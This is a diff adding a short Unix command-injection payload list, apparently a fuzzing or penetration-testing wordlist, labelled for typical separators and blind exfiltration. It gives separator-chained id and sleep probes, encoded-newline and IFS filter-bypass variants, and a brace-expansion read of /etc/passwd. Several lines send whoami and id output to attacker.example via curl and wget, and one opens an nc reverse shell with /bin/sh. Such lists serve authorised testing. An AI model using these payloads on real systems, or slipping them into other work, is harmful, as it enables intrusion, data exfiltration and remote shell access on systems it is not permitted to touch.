@@ -1,0 +1,22 @@
+# command-injection/unix — typical separators + blind exfil
+;id
+&&id
+||id
+|id
+`id`
+$(id)
+;sleep 5
+&&sleep 5
+||sleep 5
+|sleep 5
+`sleep 5`
+$(sleep 5)
+;curl http://attacker.example/$(id|base64)
+;wget http://attacker.example/$(whoami)
+;nc attacker.example 4444 -e /bin/sh
+&& curl http://attacker.example/`whoami`
+%0Aid
+%0A%0Did
+${IFS}id
+{cat,/etc/passwd}
+$IFS$9id
